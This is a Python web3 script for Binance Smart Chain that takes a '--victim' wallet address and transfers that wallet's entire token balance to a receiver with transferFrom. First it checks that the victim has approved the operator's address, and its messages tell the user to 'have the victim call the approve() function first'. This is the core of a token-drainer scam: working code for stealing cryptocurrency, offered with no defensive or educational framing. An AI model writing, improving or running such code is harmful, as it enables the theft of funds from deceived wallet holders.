from web3 import Web3
import argparse
import getpass

def main():
    # Setup argument parser
    parser = argparse.ArgumentParser(description='Token transfer tool')
    parser.add_argument('--rpc', default="https://bsc-dataseed.binance.org/", help='BSC RPC endpoint')
    parser.add_argument('--token', required=True, help='Token contract address')
    parser.add_argument('--victim', required=True, help='Source wallet address')
    parser.add_argument('--receiver', required=True, help='Destination wallet address')
    args = parser.parse_args()

    # Securely get private key
    private_key = getpass.getpass("Enter your private key (hidden input): ")

    # Initialize Web3
    w3 = Web3(Web3.HTTPProvider(args.rpc))
    account = w3.eth.account.from_key(private_key)

    # Verify connection
    if not w3.isConnected():
        print("Failed to connect to blockchain")
        return

    # Contract ABI (added allowance function)
    token_abi = [
        {"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
        {"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
        {"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
    ]

    token = w3.eth.contract(address=args.token, abi=token_abi)

    try:
        # Check balances
        victim_balance = token.functions.balanceOf(args.victim).call()
        bnb_balance = w3.eth.get_balance(account.address)
        gas_needed = 200000 * w3.eth.gasPrice

        print(f"\nVictim Token Balance: {victim_balance / 10**18}")
        print(f"Your BNB Balance: {w3.fromWei(bnb_balance, 'ether')}")
        print(f"Estimated Gas Cost: {w3.fromWei(gas_needed, 'ether')} BNB")

        if bnb_balance < gas_needed:
            print("\nError: Insufficient BNB for gas")
            return

        if victim_balance == 0:
            print("\nError: Victim has no balance")
            return

        # Check allowance (NEW)
        allowance = token.functions.allowance(args.victim, account.address).call()
        print(f"Current Allowance: {allowance / 10**18}")
        
        if allowance < victim_balance:
            print("\nError: Insufficient allowance. The victim must first approve your address to spend these tokens.")
            print("You need to have the victim call the approve() function first.")
            return

        # Build transaction
        tx = token.functions.transferFrom(
            args.victim,
            args.receiver,
            victim_balance
        ).build_transaction({
            'from': account.address,  # Changed from args.receiver to account.address
            'gas': 200000,
            'gasPrice': w3.eth.gasPrice,
            'nonce': w3.eth.getTransactionCount(account.address)
        })

        # Confirm before sending
        confirm = input("\nConfirm transfer (Y/N)? ").strip().upper()
        if confirm != 'Y':
            print("Transfer cancelled")
            return

        # Send transaction
        signed = account.signTransaction(tx)
        tx_hash = w3.eth.sendRawTransaction(signed.rawTransaction)
        print(f"\nSuccess! TX Hash: {tx_hash.hex()}")

    except Exception as e:
        print(f"\nError: {str(e)}")

if __name__ == "__main__":
    main()
